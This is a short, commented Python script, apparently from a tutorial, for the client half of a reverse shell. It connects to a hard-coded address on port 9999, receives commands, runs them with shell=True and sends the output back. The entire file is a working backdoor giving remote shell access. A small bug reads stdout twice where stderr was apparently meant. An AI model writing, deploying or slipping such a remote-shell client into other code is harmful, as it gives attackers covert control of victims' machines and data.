import socket
import os
import subprocess
# os and subprocess will help to run the commands

s = socket.socket() # creating a socket
host = "192.168.42.128" # ip address of the host
port = 9999 # should be same in server and client files

s.connect((host, port)) # binding host and port

while True:
    data = s.recv(1024) # 1024 is buffer size and it is the amount of chunks in which the data will be recieved by server
    if data[:2].decode("utf-8") == 'cd': # we will decode the byte data into utf-8
        os.chdir(data[3:].decode("utf-8")) # to execute the commands with 'cd'(change-directory)

    if len(data) > 0: # if the instruction is in data or not
        # Popen will open a new subprocess for the command from the server
        # shell=True will give the access to the shell commands
        cmd = subprocess.Popen(data[:].decode("utf-8"), shell=True, stdout=subprocess.PIPE, stdin=subprocess.PIPE, stderr=subprocess.PIPE)
        # outputs
        output_byte = cmd.stdout.read() + cmd.stdout.read()
        output_str = str(output_byte, "utf-8")
        currentWD = str(os.getcwd())+ "> " # get current working directory
        s.send(str.encode(output_str)) # send the output string to server

        # to print on client's pc
        #print(output_str)
